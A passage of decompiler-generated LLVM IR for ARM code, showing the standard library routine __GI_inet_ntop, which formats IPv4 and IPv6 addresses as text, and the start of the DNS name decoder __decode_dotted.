  uselistorder i32 %v2_1574c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15740, { 0, 2, 1 }
  uselistorder i32 %v1_15680, { 1, 0 }
  uselistorder i32 %v1_15714, { 1, 0 }
  uselistorder i32 %v1_156c8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15730, { 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 4, 5, 0, 1, 2, 3 }
  uselistorder i8 48, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15794, { 1, 0 }
  uselistorder label %dec_label_pc_15730, { 1, 0 }
  uselistorder label %dec_label_pc_156fc, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_157a8 = load i32, i32* @r5, align 4
  %v7_157b4 = icmp eq i32 %arg1, 2
  store i1 %v7_157b4, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_157b4, label %dec_label_pc_157d8, label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %entry
  %v7_157cc = icmp eq i32 %arg1, 10
  store i1 %v7_157cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_157cc, label %dec_label_pc_157ec, label %dec_label_pc_15a08

dec_label_pc_157d8:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_157e4 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_15a00

dec_label_pc_157ec:                               ; preds = %dec_label_pc_157cc
  %v2_157ec = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_157ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_157f8 = bitcast i32* %stack_var_-72 to i8*
  %v4_157f8 = call i32 @__GI_memset(i8* %v3_157f8, i32 0, i32 32)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1581c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_15800

dec_label_pc_15800:                               ; preds = %dec_label_pc_15800.dec_label_pc_15800_crit_edge, %dec_label_pc_157ec
  %v0_15818 = phi i32 [ %v0_15800.pre, %dec_label_pc_15800.dec_label_pc_15800_crit_edge ], [ 0, %dec_label_pc_157ec ]
  %v1_15800 = load i32, i32* @r8, align 4
  %v2_15800 = add i32 %v1_15800, %v0_15818
  %v3_15804 = inttoptr i32 %v2_15800 to i8*
  %v4_15804 = load i8, i8* %v3_15804, align 1
  %v6_15804 = zext i8 %v4_15804 to i32
  store i32 %v6_15804, i32* %r1.global-to-local, align 4
  %v1_15808 = add i32 %v2_15800, 1
  %v2_15808 = inttoptr i32 %v1_15808 to i8*
  %v3_15808 = load i8, i8* %v2_15808, align 1
  %v4_15808 = zext i8 %v3_15808 to i32
  %tmp74 = icmp slt i32 %v0_15818, 0
  %v4_1580c = zext i1 %tmp74 to i32
  %v5_1580c = add i32 %v4_1580c, %v0_15818
  %v4_15810 = mul nuw nsw i32 %v6_15804, 256
  %v5_15810 = or i32 %v4_15808, %v4_15810
  %v3_15814 = sdiv i32 %v5_1580c, 2
  %v1_15818 = add i32 %v0_15818, 2
  store i32 %v1_15818, i32* %r0.global-to-local, align 4
  store i32 %v2_1581c, i32* %r1.global-to-local, align 4
  %v4_15820 = mul i32 %v3_15814, 4
  %v5_15820 = add i32 %v4_15820, %v2_1581c
  %v7_15824 = icmp eq i32 %v1_15818, 15
  store i1 %v7_15824, i1* %cpsr_z.global-to-local, align 1
  %v2_15828 = add i32 %v5_15820, -32
  %v3_15828 = inttoptr i32 %v2_15828 to i32*
  store i32 %v5_15810, i32* %v3_15828, align 4
  %v7_1582c = icmp sgt i32 %v1_15818, 15
  br i1 %v7_1582c, label %dec_label_pc_15830, label %dec_label_pc_15800.dec_label_pc_15800_crit_edge

dec_label_pc_15800.dec_label_pc_15800_crit_edge:  ; preds = %dec_label_pc_15800
  %v0_15800.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15800

dec_label_pc_15830:                               ; preds = %dec_label_pc_15800
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15848

dec_label_pc_15848:                               ; preds = %dec_label_pc_15830, %dec_label_pc_15894
  %v0_15888 = phi i32 [ -1, %dec_label_pc_15830 ], [ %v0_158bc, %dec_label_pc_15894 ]
  %v0_15878 = phi i32 [ -1, %dec_label_pc_15830 ], [ %v0_158a8, %dec_label_pc_15894 ]
  %v0_1585c = phi i32 [ -1, %dec_label_pc_15830 ], [ %v0_1585c7, %dec_label_pc_15894 ]
  %v0_15894 = phi i32 [ 0, %dec_label_pc_15830 ], [ %v1_15894, %dec_label_pc_15894 ]
  %v4_1584c = mul nuw nsw i32 %v0_15894, 4
  %v5_1584c = add i32 %v4_1584c, %v2_1581c
  %v1_15850 = add i32 %v5_1584c, -32
  %v2_15850 = inttoptr i32 %v1_15850 to i32*
  %v3_15850 = load i32, i32* %v2_15850, align 4
  %v2_15854 = icmp eq i32 %v3_15850, 0
  %v7_1585c = icmp eq i32 %v0_1585c, -1
  br i1 %v2_15854, label %dec_label_pc_1585c, label %dec_label_pc_15870

dec_label_pc_1585c:                               ; preds = %dec_label_pc_15848
  br i1 %v7_1585c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1585c
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_15894

.thread:                                          ; preds = %dec_label_pc_1585c
  %v1_15868.pre = load i32, i32* @r4, align 4
  %v2_15868 = add i32 %v1_15868.pre, 1
  store i32 %v2_15868, i32* @r4, align 4
  br label %dec_label_pc_15894

dec_label_pc_15870:                               ; preds = %dec_label_pc_15848
  br i1 %v7_1585c, label %dec_label_pc_15894, label %dec_label_pc_15878

dec_label_pc_15878:                               ; preds = %dec_label_pc_15870
  %v7_15878 = icmp eq i32 %v0_15878, -1
  %v0_1588c.pre = load i32, i32* @r4, align 4
  %v1_15880 = load i32, i32* @r7, align 4
  %v7_15884 = icmp sgt i32 %v0_1588c.pre, %v1_15880
  %or.cond = or i1 %v7_15878, %v7_15884
  br i1 %or.cond, label %dec_label_pc_15888, label %dec_label_pc_15890

dec_label_pc_15888:                               ; preds = %dec_label_pc_15878
  store i32 %v0_15888, i32* @r6, align 4
  store i32 %v0_1588c.pre, i32* @r7, align 4
  br label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %dec_label_pc_15878, %dec_label_pc_15888
  %v0_1587812 = phi i32 [ %v0_15888, %dec_label_pc_15888 ], [ %v0_15878, %dec_label_pc_15878 ]
  br label %dec_label_pc_15894

dec_label_pc_15894:                               ; preds = %bb, %.thread, %dec_label_pc_15870, %dec_label_pc_15890
  %v0_158bc = phi i32 [ %v0_15888, %.thread ], [ %v0_15894, %bb ], [ %v0_15888, %dec_label_pc_15870 ], [ -1, %dec_label_pc_15890 ]
  %v0_1585c7 = phi i32 [ %v0_1585c, %.thread ], [ %v0_15894, %bb ], [ -1, %dec_label_pc_15870 ], [ -1, %dec_label_pc_15890 ]
  %v0_158a8 = phi i32 [ %v0_15878, %.thread ], [ %v0_15878, %bb ], [ %v0_15878, %dec_label_pc_15870 ], [ %v0_1587812, %dec_label_pc_15890 ]
  %v1_15894 = add nuw nsw i32 %v0_15894, 1
  store i32 %v1_15894, i32* %r1.global-to-local, align 4
  %v7_1589c = icmp slt i32 %v1_15894, 8
  br i1 %v7_1589c, label %dec_label_pc_15848, label %dec_label_pc_158a0

dec_label_pc_158a0:                               ; preds = %dec_label_pc_15894
  %v7_158a0 = icmp eq i32 %v0_158bc, -1
  store i1 %v7_158a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158a0, label %dec_label_pc_158a0.dec_label_pc_158c0_crit_edge, label %dec_label_pc_158a8

dec_label_pc_158a0.dec_label_pc_158c0_crit_edge:  ; preds = %dec_label_pc_158a0
  %v1_158e4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_158c0

dec_label_pc_158a8:                               ; preds = %dec_label_pc_158a0
  %v7_158a8 = icmp eq i32 %v0_158a8, -1
  store i1 %v7_158a8, i1* %cpsr_z.global-to-local, align 1
  %v0_158b8.pre = load i32, i32* @r4, align 4
  br i1 %v7_158a8, label %dec_label_pc_158b8, label %dec_label_pc_158b0

dec_label_pc_158b0:                               ; preds = %dec_label_pc_158a8
  %v1_158b0 = load i32, i32* @r7, align 4
  %v9_158b0 = icmp eq i32 %v0_158b8.pre, %v1_158b0
  store i1 %v9_158b0, i1* %cpsr_z.global-to-local, align 1
  %v7_158b4 = icmp sgt i32 %v0_158b8.pre, %v1_158b0
  br i1 %v7_158b4, label %dec_label_pc_158b8, label %dec_label_pc_158c0

dec_label_pc_158b8:                               ; preds = %dec_label_pc_158a8, %dec_label_pc_158b0
  store i32 %v0_158b8.pre, i32* @r7, align 4
  store i32 %v0_158bc, i32* @r6, align 4
  br label %dec_label_pc_158c0

dec_label_pc_158c0:                               ; preds = %dec_label_pc_158a0.dec_label_pc_158c0_crit_edge, %dec_label_pc_158b0, %dec_label_pc_158b8
  %v1_158e4.pre = phi i32 [ %v1_158b0, %dec_label_pc_158b0 ], [ %v1_158e4.pre.pre, %dec_label_pc_158a0.dec_label_pc_158c0_crit_edge ], [ %v0_158b8.pre, %dec_label_pc_158b8 ]
  %v0_158c0 = phi i32 [ %v0_158a8, %dec_label_pc_158b0 ], [ %v0_158a8, %dec_label_pc_158a0.dec_label_pc_158c0_crit_edge ], [ %v0_158bc, %dec_label_pc_158b8 ]
  %v7_158c0 = icmp eq i32 %v0_158c0, -1
  store i1 %v7_158c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_158c0, label %dec_label_pc_158c0._crit_edge, label %dec_label_pc_158c8

dec_label_pc_158c8:                               ; preds = %dec_label_pc_158c0
  %v7_158c8 = icmp eq i32 %v1_158e4.pre, 1
  store i1 %v7_158c8, i1* %cpsr_z.global-to-local, align 1
  %v7_158cc = icmp slt i32 %v1_158e4.pre, 2
  br i1 %v7_158cc, label %bb54, label %dec_label_pc_158c0._crit_edge

bb54:                                             ; preds = %dec_label_pc_158c8
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_158c0._crit_edge

dec_label_pc_158c0._crit_edge:                    ; preds = %dec_label_pc_158c0, %dec_label_pc_158c8, %bb54
  %v0_158e4 = phi i32 [ %v0_158c0, %dec_label_pc_158c8 ], [ -1, %bb54 ], [ %v0_158c0, %dec_label_pc_158c0 ]
  %v2_158d4 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_158d4, i32* @r4, align 4
  %v0_158d8 = load i32, i32* @r5, align 4
  %v2_158d8 = add i32 %v0_158d8, -33228
  store i32 %v2_158d8, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_158e4 = add i32 %v0_158e4, %v1_158e4.pre
  store i32 %v2_158e4, i32* @sl, align 4
  %v9_15944 = icmp eq i32 %tmp, 65535
  %v7_158ec68 = icmp eq i32 %v0_158e4, -1
  store i1 %v7_158ec68, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_158ec

dec_label_pc_158ec:                               ; preds = %dec_label_pc_158c0._crit_edge, %dec_label_pc_1599c
  %v7_158ec72 = phi i1 [ %v7_158ec68, %dec_label_pc_158c0._crit_edge ], [ %v7_158ec, %dec_label_pc_1599c ]
  %v0_1591871 = phi i32 [ 0, %dec_label_pc_158c0._crit_edge ], [ %v1_1599c, %dec_label_pc_1599c ]
  %v1_1590470 = phi i32 [ %v0_158e4, %dec_label_pc_158c0._crit_edge ], [ %v0_158ec.pre, %dec_label_pc_1599c ]
  %v2_1591c69 = phi i32 [ %v2_158d4, %dec_label_pc_158c0._crit_edge ], [ %v3_1590829, %dec_label_pc_1599c ]
  br i1 %v7_158ec72, label %dec_label_pc_15910, label %dec_label_pc_158f4

dec_label_pc_158f4:                               ; preds = %dec_label_pc_158ec
  %v9_158f4 = icmp eq i32 %v0_1591871, %v1_1590470
  store i1 %v9_158f4, i1* %cpsr_z.global-to-local, align 1
  %v5_158f8 = icmp slt i32 %v0_1591871, %v1_1590470
  br i1 %v5_158f8, label %dec_label_pc_15910, label %dec_label_pc_158fc

dec_label_pc_158fc:                               ; preds = %dec_label_pc_158f4
  %v1_158fc = load i32, i32* @sl, align 4
  %v9_158fc = icmp eq i32 %v0_1591871, %v1_158fc
  store i1 %v9_158fc, i1* %cpsr_z.global-to-local, align 1
  %v6_15900 = icmp slt i32 %v0_1591871, %v1_158fc
  br i1 %v6_15900, label %dec_label_pc_15904, label %dec_label_pc_15910

dec_label_pc_15904:                               ; preds = %dec_label_pc_158fc
  store i1 %v9_158f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_158f4, label %bb56, label %dec_label_pc_1599c

bb56:                                             ; preds = %dec_label_pc_15904
  %v1_15908 = load i32, i32* @sb, align 4
  %v2_15908 = trunc i32 %v1_15908 to i8
  %v4_15908 = inttoptr i32 %v2_1591c69 to i8*
  store i8 %v2_15908, i8* %v4_15908, align 1
  %v5_15908 = load i32, i32* @r4, align 4
  %v6_15908 = add i32 %v5_15908, 1
  store i32 %v6_15908, i32* @r4, align 4
  br label %dec_label_pc_1599c

dec_label_pc_15910:                               ; preds = %dec_label_pc_158fc, %dec_label_pc_158f4, %dec_label_pc_158ec
  %v2_15910 = icmp eq i32 %v0_1591871, 0
  store i1 %v2_15910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15910, label %dec_label_pc_15980, label %dec_label_pc_15918

dec_label_pc_15918:                               ; preds = %dec_label_pc_15910
  %v7_15918 = icmp eq i32 %v0_1591871, 6
  store i1 %v7_15918, i1* %cpsr_z.global-to-local, align 1
  %v0_1591c = load i32, i32* @sb, align 4
  %v1_1591c = trunc i32 %v0_1591c to i8
  %v3_1591c = inttoptr i32 %v2_1591c69 to i8*
  store i8 %v1_1591c, i8* %v3_1591c, align 1
  %v4_1591c = load i32, i32* @r4, align 4
  %v5_1591c = add i32 %v4_1591c, 1
  store i32 %v5_1591c, i32* @r4, align 4
  %v0_15920 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15920, label %dec_label_pc_15924, label %dec_label_pc_15980

dec_label_pc_15924:                               ; preds = %dec_label_pc_15918
  %v0_15924 = load i32, i32* @r6, align 4
  %v2_15924 = icmp eq i32 %v0_15924, 0
  store i1 %v2_15924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15924, label %dec_label_pc_1592c, label %dec_label_pc_15980

dec_label_pc_1592c:                               ; preds = %dec_label_pc_15924
  %v0_1592c = load i32, i32* @r7, align 4
  %v7_1592c = icmp eq i32 %v0_1592c, 6
  store i1 %v7_1592c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1592c, label %dec_label_pc_1594c, label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_1592c
  %v7_15934 = icmp eq i32 %v0_1592c, 5
  store i1 %v7_15934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15934, label %dec_label_pc_1593c, label %dec_label_pc_15980

dec_label_pc_1593c:                               ; preds = %dec_label_pc_15934
  store i32 65535, i32* %r1.global-to-local, align 4
  store i1 %v9_15944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15944, label %dec_label_pc_1594c, label %dec_label_pc_15980

dec_label_pc_1594c:                               ; preds = %dec_label_pc_1593c, %dec_label_pc_1592c
  %v2_15950 = sub i32 %v2_1581c, %v5_1591c
  store i32 %v5_1591c, i32* %r1.global-to-local, align 4
  %v0_15958 = load i32, i32* @r8, align 4
  %v1_15958 = add i32 %v0_15958, 12
  store i32 %v1_15958, i32* %r0.global-to-local, align 4
  %v1_1595c = add i32 %v2_15950, -32
  %v3_15960 = call i32 @inet_ntop4(i32 %v1_15958, i32 %v5_1591c, i32 %v1_1595c)
  store i32 %v3_15960, i32* %r0.global-to-local, align 4
  %v2_15964 = icmp eq i32 %v3_15960, 0
  store i1 %v2_15964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15964, label %bb57, label %dec_label_pc_15970

bb57:                                             ; preds = %dec_label_pc_1594c
  %v1_15968 = load i32, i32* @r6, align 4
  store i32 %v1_15968, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a20

dec_label_pc_15970:                               ; preds = %dec_label_pc_1594c
  %v0_15970 = load i32, i32* @r4, align 4
  %v1_15970 = inttoptr i32 %v0_15970 to i8*
  store i32 %v0_15970, i32* %r0.global-to-local, align 4
  %v3_15974 = call i32 @strlen(i8* %v1_15970)
  store i32 %v3_15974, i32* %r0.global-to-local, align 4
  %v0_15978 = load i32, i32* @r4, align 4
  %v2_15978 = add i32 %v0_15978, %v3_15974
  store i32 %v2_15978, i32* @r4, align 4
  %v0_159b0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_159b0

dec_label_pc_15980:                               ; preds = %dec_label_pc_1593c, %dec_label_pc_15934, %dec_label_pc_15924, %dec_label_pc_15918, %dec_label_pc_15910
  %v0_15988 = phi i32 [ %v5_1591c, %dec_label_pc_1593c ], [ %v5_1591c, %dec_label_pc_15934 ], [ %v5_1591c, %dec_label_pc_15924 ], [ %v5_1591c, %dec_label_pc_15918 ], [ %v2_1591c69, %dec_label_pc_15910 ]
  store i32 %v2_1581c, i32* @lr, align 4
  %v1_15984 = load i32, i32* @r5, align 4
  %v4_15984 = mul i32 %v1_15984, 4
  %v5_15984 = add i32 %v4_15984, %v2_1581c
  store i32 %v0_15988, i32* @r0, align 4
  %v1_1598c = add i32 %v5_15984, -32
  %v2_1598c = inttoptr i32 %v1_1598c to i32*
  %v3_1598c = load i32, i32* %v2_1598c, align 4
  %v0_15990 = load i32, i32* @fp, align 4
  store i32 %v0_15990, i32* %r1.global-to-local, align 4
  %v4_15994 = call i32 @sprintf(i32 %v0_15988, i32 %v0_15990, i32 %v3_1598c, i32 %v5_15984)
  store i32 %v4_15994, i32* %r0.global-to-local, align 4
  %v0_15998 = load i32, i32* @r4, align 4
  %v2_15998 = add i32 %v0_15998, %v4_15994
  store i32 %v2_15998, i32* @r4, align 4
  br label %dec_label_pc_1599c

dec_label_pc_1599c:                               ; preds = %bb56, %dec_label_pc_15904, %dec_label_pc_15980
  %v3_1590829 = phi i32 [ %v6_15908, %bb56 ], [ %v2_1591c69, %dec_label_pc_15904 ], [ %v2_15998, %dec_label_pc_15980 ]
  %v0_1599c = load i32, i32* @r5, align 4
  %v1_1599c = add i32 %v0_1599c, 1
  store i32 %v1_1599c, i32* @r5, align 4
  %v0_158ec.pre = load i32, i32* @r6, align 4
  %v7_159a4 = icmp slt i32 %v1_1599c, 8
  %v7_158ec = icmp eq i32 %v0_158ec.pre, -1
  store i1 %v7_158ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159a4, label %dec_label_pc_158ec, label %dec_label_pc_159a8

dec_label_pc_159a8:                               ; preds = %dec_label_pc_1599c
  br i1 %v7_158ec, label %.thread2, label %dec_label_pc_159b0

dec_label_pc_159b0:                               ; preds = %dec_label_pc_159a8, %dec_label_pc_15970
  %v3_159bc = phi i32 [ %v3_1590829, %dec_label_pc_159a8 ], [ %v2_15978, %dec_label_pc_15970 ]
  %v0_159b0 = phi i32 [ %v0_158ec.pre, %dec_label_pc_159a8 ], [ %v0_159b0.pre, %dec_label_pc_15970 ]
  %v1_159b0 = load i32, i32* @r7, align 4
  %v2_159b0 = add i32 %v1_159b0, %v0_159b0
  %v7_159b4 = icmp eq i32 %v2_159b0, 8
  store i1 %v7_159b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_159b4, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_159b0
  %v4_159bc = inttoptr i32 %v3_159bc to i8*
  store i8 58, i8* %v4_159bc, align 1
  %v5_159bc = load i32, i32* @r4, align 4
  %v6_159bc = add i32 %v5_159bc, 1
  store i32 %v6_159bc, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_159b0, %dec_label_pc_159a8, %bb58
  %v2_159c4 = phi i32 [ %v3_159bc, %dec_label_pc_159b0 ], [ %v3_1590829, %dec_label_pc_159a8 ], [ %v6_159bc, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_159c4 = inttoptr i32 %v2_159c4 to i8*
  store i8 0, i8* %v3_159c4, align 1
  %v4_159c4 = load i32, i32* @r4, align 4
  %v5_159c4 = add i32 %v4_159c4, 1
  store i32 %v2_158d4, i32* @r1, align 4
  %v2_159cc = load i32, i32* %stack_var_-128, align 4
  %v2_159d0 = sub i32 %v5_159c4, %v2_158d4
  %v9_159d4 = icmp eq i32 %v2_159d0, %v2_159cc
  store i1 %v9_159d4, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_159d0, %v2_159cc
  br i1 %tmp75, label %dec_label_pc_159dc, label %dec_label_pc_159f8

dec_label_pc_159dc:                               ; preds = %.thread2
  %v0_159e0 = call i32 @__aeabi_read_tp()
  store i32 %v0_159e0, i32* %r0.global-to-local, align 4
  %v3_159e4 = load i16, i16* @global_var_23164.175, align 2
  %v4_159e4 = sext i16 %v3_159e4 to i32
  %v0_159ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_159ec, i32* %r1.global-to-local, align 4
  %v3_159f0 = add i32 %v4_159e4, %v0_159e0
  %v4_159f0 = inttoptr i32 %v3_159f0 to i32*
  store i32 28, i32* %v4_159f0, align 4
  %v0_15a20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a20

dec_label_pc_159f8:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_159fc = inttoptr i32 %arg3 to i8*
  %v3_159fc = call i32 @strcpy(i8* %v2_159fc, i32 %v2_158d4)
  br label %dec_label_pc_15a00

dec_label_pc_15a00:                               ; preds = %dec_label_pc_157d8, %dec_label_pc_159f8
  %storemerge = phi i32 [ %v3_157e4, %dec_label_pc_157d8 ], [ %v3_159fc, %dec_label_pc_159f8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a20

dec_label_pc_15a08:                               ; preds = %dec_label_pc_157cc
  %v0_15a0c = call i32 @__aeabi_read_tp()
  store i32 %v0_15a0c, i32* %r0.global-to-local, align 4
  %v3_15a10 = load i16, i16* @global_var_23164.175, align 2
  %v4_15a10 = sext i16 %v3_15a10 to i32
  %v3_15a18 = add i32 %v4_15a10, %v0_15a0c
  %v4_15a18 = inttoptr i32 %v3_15a18 to i32*
  store i32 97, i32* %v4_15a18, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15a20

dec_label_pc_15a20:                               ; preds = %bb57, %dec_label_pc_15a00, %dec_label_pc_159dc, %dec_label_pc_15a08
  %v0_15a20 = phi i32 [ %v1_15968, %bb57 ], [ %storemerge, %dec_label_pc_15a00 ], [ %v0_15a20.pre, %dec_label_pc_159dc ], [ 0, %dec_label_pc_15a08 ]
  store i32 %v0_15a20, i32* %r0.global-to-local, align 4
  store i32 %v6_157a8, i32* %r5.global-to-local, align 4
  ret i32 %v0_15a20

; uselistorder directives
  uselistorder i32 %v0_15a20, { 1, 0 }
  uselistorder i1 %v7_158ec, { 2, 0, 1 }
  uselistorder i32 %v0_158ec.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1599c, { 0, 2, 1 }
  uselistorder i32 %v0_15988, { 1, 0 }
  uselistorder i32 %v0_15970, { 1, 0 }
  uselistorder i32 %v5_1591c, { 3, 4, 5, 6, 2, 1, 0, 7 }
  uselistorder i1 %v9_158f4, { 1, 0, 2 }
  uselistorder i32 %v2_1591c69, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1591871, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_158ec68, { 1, 0 }
  uselistorder i32 %v2_158d4, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_158e4, { 1, 0, 2 }
  uselistorder i1 %v7_158c0, { 1, 0 }
  uselistorder i32 %v0_158c0, { 1, 2, 0 }
  uselistorder i32 %v1_158e4.pre, { 2, 0, 1 }
  uselistorder i32 %v0_158b8.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_158a8, { 1, 0 }
  uselistorder i1 %v7_158a0, { 1, 0 }
  uselistorder i32 %v1_15894, { 1, 2, 0 }
  uselistorder i32 %v0_158a8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_158bc, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1585c, { 1, 0 }
  uselistorder i32 %v0_15894, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15878, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_15888, { 3, 1, 0, 2 }
  uselistorder i32 %v1_15818, { 1, 0, 2 }
  uselistorder i32 %v2_15800, { 1, 0 }
  uselistorder i32 %v0_15818, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1581c, { 0, 4, 3, 1, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 22, 14, 15, 16, 17, 18, 23, 19, 20, 21 }
  uselistorder i32 97, { 2, 3, 5, 1, 0, 6, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @sprintf, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15a20, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_15a00, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1599c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_158ec, { 1, 0 }
  uselistorder label %dec_label_pc_158c0._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158b8, { 1, 0 }
  uselistorder label %dec_label_pc_15894, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15890, { 1, 0 }
  uselistorder label %dec_label_pc_15848, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_15a44 = load i32, i32* @r5, align 4
  %v0_15a48 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15a48, i32* %sl.global-to-local, align 4
  %v2_15a48 = icmp eq i32 %v0_15a48, 0
  br i1 %v2_15a48, label %.thread30, label %dec_label_pc_15a70.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15b30

dec_label_pc_15a70.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_15a704 = load i32, i32* @r1, align 4
  %v6_15a7414 = icmp slt i32 %v0_15a704, %arg2
  br i1 %v6_15a7414, label %dec_label_pc_15a78.preheader, label %dec_label_pc_15b30

dec_label_pc_15a78.preheader:                     ; preds = %dec_label_pc_15a70.preheader
  %v2_15a7851 = add i32 %v0_15a48, %v0_15a704
  %v3_15a7852 = inttoptr i32 %v2_15a7851 to i8*
